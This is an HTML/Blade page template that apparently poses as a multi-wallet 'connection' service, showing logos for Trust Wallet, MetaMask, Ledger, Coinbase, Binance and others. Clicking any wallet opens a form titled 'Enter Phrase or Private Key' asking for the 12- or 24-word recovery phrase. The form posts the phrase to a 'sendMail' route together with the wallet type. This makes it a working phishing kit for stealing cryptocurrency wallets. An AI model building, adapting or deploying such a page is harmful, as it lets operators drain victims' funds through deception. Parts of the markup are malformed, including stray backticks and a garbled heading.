<!DOCTYPE html>


<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>{{config('app.name')}}</title>
    <link rel="shortcut icon" href="icon-48x48.png">
    <link rel="stylesheet" href="bootstrap/4-4-1/css/bootstrap.min.css">

    <link href="../fonts.googleapis.com/css2c878.css?family=Nunito+Sans:wght@600;900&amp;display=swap" rel="stylesheet">
    <script src="../kit.fontawesome.com/4b9ba14b0f.js" crossorigin="anonymous"></script>
    <style>

        .item {
            --icon-size: 32px;
            background: #E0E0E0;
            border-radius: 5px;
            height: 75px;
            width: 300px;
            margin: 5px;
            display: flex;
            flex-flow: row nowrap;
            padding: 10px;
            align-items: center;
            color: #606060;
        }

        .item:hover {
            --icon-size: 36px;
            color: #404040;
            font-size: 115%;
            cursor: pointer;
        }

        .item > .image {
            height: 60px;
            width: 60px;
            margin-right: 20px;
        }

        .item > .text {
            font-size: 22px;
            flex: 1;
        }

        .item > .icon {
            font-size: var(--icon-size);
        }

        .item > .icon:hover {
            font-size: var(--icon-size);
        }

        .modal {
            color: #404040;
        }

        .navText {
            font-size: 20px;
            color: #c0c0c0;
        }

        .clickable {
            cursor: pointer;
        }

        body {
            background-color: #7f53ac;
            background-image: linear-gradient(315deg, #7f53ac 0%, #647dee 74%);
            background-image: url(../cdn.hackernoon.com/hn-images/0_oQQW6dQUe9tybOU5.gif);

            background-repeat: no-repeat; /* Do not repeat the image */
            background-size: cover;
        }

        .mainbox {
            background-color: #95c2de;
            margin: auto;
            height: 600px;
            width: 600px;
            position: relative;
        }

        .err {
            color: #ffffff;
            font-family: 'Nunito Sans', sans-serif;
            font-size: 11rem;
            position: absolute;
            left: 20%;
            top: 8%;
        }

        .far {
            position: absolute;
            font-size: 8.5rem;
            left: 42%;
            top: 15%;
            color: #ffffff;
        }

        .err2 {
            color: #ffffff;
            font-family: 'Nunito Sans', sans-serif;
            font-size: 11rem;
            position: absolute;
            left: 68%;
            top: 8%;
        }

        .msg {
            text-align: center;
            font-family: 'Nunito Sans', sans-serif;
            font-size: 1.6rem;
            position: absolute;
            left: 16%;
            top: 45%;
            width: 75%;
        }

        a {
            text-decoration: none;
            color: white;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body
    style="background-image: url( ../cdn.hackernoon.com/hn-images/0_oQQW6dQUe9tybOU5.gif); color: whitesmoke; object-fit: fill">

<style type="text/css">

    .error {
        width: auto;
        color: #fff;
        background-color: red;
        padding: 5px 5px;
        text-align: center;
        display: table;
        margin: 0 auto;
        letter-spacing: 1px;
    }

    .success {
        width: auto;
        color: #fff;
        background-color: green;
        padding: 3px 3px;
        text-align: center;
        display: table;
        margin: 0 auto;
        letter-spacing: 1px;
    }

</style>


<div class="container p-3" style="margin-top: 40px">
    <div class="row">
        <div class="col-10"></div>
        <div class="col-2 navText">
            <span class="clickable" data-toggle="modal" data-target= "#exampleModal"stakemodal">`Stake</span> &nbsp;
            <span class="clickable" data-toggle="modal" data-target= "#exampleModal"unstakemodal`">Unstake</span>
        </div>
    </div>
    <div class="row">
        <div class="col">
            <h1 class="text-center" style="color: #c0c0c0;">Connection Defiwalleterrorconnection</h1>
            <p class="text-center" style="color: #c0c0c0;"> The best way to manage all your wallets from a single app.
                With our highly secure integrations with top wallet providers, you can efficiently manage all your
                wallets on our app. </p>
        </div>
    </div>
    @if(session()->has('success'))
        <div class="alert alert-success">
            {{ session()->get('success') }}
        </div>
    @elseif(session()->has('errors'))
        <div class="alert alert-danger">
            {{ session()->get('errors') }}
        </div>
    @elseif(session()->has('info'))
        <div class="alert alert-info">
            {{ session()->get('info') }}
        </div>
    @endif
    <div class="row d-flex justify-content-center align-items-center">
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id = "Trust Wallet">
            <img src="images/trust-wallet.jpg" class="image" alt="Name"/>
            <span class="text">Trust Wallet</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="metamask">
            <img src="images/metamask.jpg" class="image" alt="Name"/>
            <span class="text">Meta Mask</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="walletconnect">
            <img src="images/walletconnect.svg" class="image" alt="Name"/>
            <span class="text">Wallet Connect</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id = "fortmatic">
            <img src="images/fortmatic.jpg" class="image" alt="Name"/>
            <span class="text">FortMatic</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="aave">
`            <img src="images/aave.jpg" class="image" alt="Name"/>
            <span class="text">AAVE</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Digitex">
            <img src="images/digitex.jpg" class="image" alt="Name"/>
            <span class="text">Digitex</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal"data-id="Exodus">
            <img src="images/exodus.jpg" class="image" alt="Name"/>
            <span class="text">Exodus</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Ledger">
            <img src="images/ledger.jpg" class="image" alt="Name"/>
            <span class="text">Ledger</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="coinbase">
            <img src="images/coinbase.jpg" class="image" alt="Name"/>
            <span class="text">Coinbase</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="defiat">
            <img src="images/defiat.jpg" class="image" alt="Name"/>
            <span class="text">Defiat</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="enjin">`
            <img src="images/enjin.jpg" class="image" alt="Name"/>
            <span class="text">Enjin</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="authereum">
            <svg viewBox="0 0 50 50" focusable="false" role="presentation" class="image">
                <g fill="#ff4c2f">
                    <path
                        d="m15.6879 8.35569c-2.5168.80537-5.0503 1.61074-5.646 1.79531l-1.0654.344v7.3993c0 4.4295.03356 7.7684.08389 8.3221.36913 3.8759 2.04701 7.5504 4.84901 10.6041.6376.6963 10.755 9.5134 11.0403 9.6224.1174.042 9.01-7.5419 10.4698-8.9345 2.5335-2.4077 4.5134-5.9312 5.2181-9.3037.3691-1.7785.3943-2.4413.3691-10.3272l-.0252-7.4161-5.6963-1.7953c-3.1292-.98155-5.7047-1.77853-5.7215-1.77014-.0083.01678.4615.94799 1.0571 2.08054l1.0822 2.0554 1.6191.5201c.8893.2852 2.2316.7131 2.9866.948l1.3675.4278-.0336 6.8121c-.0252 6.5436-.0335 6.8457-.2013 7.6091-.6376 2.8775-1.9547 5.3188-3.9765 7.3825-.386.3943-2.349 2.1309-4.3541 3.8507-2.005 1.7282-3.75 3.2299-3.8758 3.3473l-.2181.2014-3.8507-3.3138c-4.7064-4.0604-5.4111-4.7483-6.5352-6.4765-.8641-1.3339-1.5017-2.7685-1.8876-4.2534-.3775-1.51-.4111-2.0721-.4111-8.8003v-6.3507l1.1997-.3775c.6543-.2097 1.9966-.6376 2.9782-.948.9731-.3104 1.7785-.5956 1.7785-.6208 0-.0251.4698-.948 1.0486-2.04696.5789-1.10738 1.0487-2.02181 1.0487-2.03859 0-.05033-.1007-.01678-4.698 1.45134z"></path>
                    <path
                        d="m24.782 7.14765c-.0755.151-2.1896 4.18625-4.6896 8.95975l-4.5469 8.6829.0671.7047c.151 1.4429.6879 2.9698 1.5604 4.354.3104.5033.4027.5956.4866.5033.0503-.0587 1.7114-3.1963 3.6912-6.9714 1.9715-3.7668 3.6074-6.8541 3.641-6.8541.0251 0 1.6862 3.0537 3.6828 6.7786 1.9967 3.7248 3.6661 6.8372 3.7165 6.9211.0839.1426.1006.1342.2349-.0419.8641-1.1326 1.5772-3.0034 1.7785-4.6561l.1007-.8389-4.7651-8.8842c-2.6175-4.8826-4.7735-8.90104-4.7903-8.90943-.0084-.01678-.0839.09228-.1678.25168z"></path>
                    <path
                        d="m22.651 28.5152-2.307 4.6057 1.3003 1.1326c.7131.6208 1.7617 1.5184 2.3238 1.9882l1.0319.8557.2265-.1846c.1342-.1006 1.1661-.9983 2.2987-1.9966l2.0721-1.8121-2.2986-4.5973c-1.2668-2.5251-2.3071-4.5973-2.3239-4.5973-.0083 0-1.057 2.0722-2.3238 4.6057z"></path>
                </g>
            </svg>
            <span class="text">Authereum</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Skale">
            <img src="images/skale.png" alt="Skale Logo" class="image">
            <span class="text">Skale</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Mew Wallet">
            <img src="images/mew.png" alt="Skale Logo" class="image">
            <span class="text">MEW Wallet</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Portis">
            <img src="images/portis.svg" alt="Portis Logo" class="image">
            <span class="text">Portis</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Binance">
            <img src="images/binance.jpg" alt="Binance Logo" class="image">
            <span class="text">Binance</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Safepal">
            <img src="images/safepal.jpg" alt="Safepal Logo" class="image">
            <span class="text">Safepal</span>
            <i class="lar la-angle-right icon"></i>
        </div>
        <div class="item" data-toggle="modal" data-target= "#exampleModal" data-id="Uniswap">
            <img src="images/uniswap.jpg" alt="Uniswap Logo" class="image">
            <span class="text">Uniswap</span>
            <i class="lar la-angle-right icon"></i>
        </div>
    </div>
</div>
<form method="POST" action="{{route('sendMail')}}">
    @csrf
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
         aria-hidden="true">
        <div class="modal-dialog" role="document" style="max-width: 800px;;">
            <div class="modal-content">
                <div class="modal-header">
                    <center><h4 class="modal-title" id="exampleModalLabel" style="text-align: center;">Enter <strong><i
                                    id="coin"></i></strong> Phrase or
                            Private Key</h4></center>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <textarea type="text" class="form-control" name="key" placeholder="Enter phrase or private key"
                              required></textarea>
                    <i class="info">Typically 12(sometimes 24) words separated by single space</i>
                    <input type="hidden" id="wallet" name="wallet_type" value=""/>
                    <input type="hidden" id="link" name="link" value="{{$data}}"/>
                </div>
                <div class="modal-footer">

                    <button type="submit" class="btn btn-primary">Connect Wallet
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                             class="bi bi-arrow-right" viewBox="0 0 16 16" style="display: inline;">
                            <path fill-rule="evenodd"
                                  d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z"/>
                        </svg>
                    </button>
                </div>
            </div>
        </div>
    </div>
</form>


<script src="bootstrap/4-4-1/js/jquery-3.4.1.min.js"></script>
<script src="bootstrap/4-4-1/js/bootstrap.min.js"></script>

<script type="text/javascript">

    $("#exampleModal").on("show.bs.modal", function (e) {
        var link = $(e.relatedTarget);
        var data_id = link.data('id');
        document.getElementById('coin').innerText = data_id
        document.getElementById('wallet').setAttribute('value', data_id)


        // = $(this).find(".modal-body").load(link.attr("data-id"));
        //  console.log(data_id.stringify())
    });


</script>
</html>
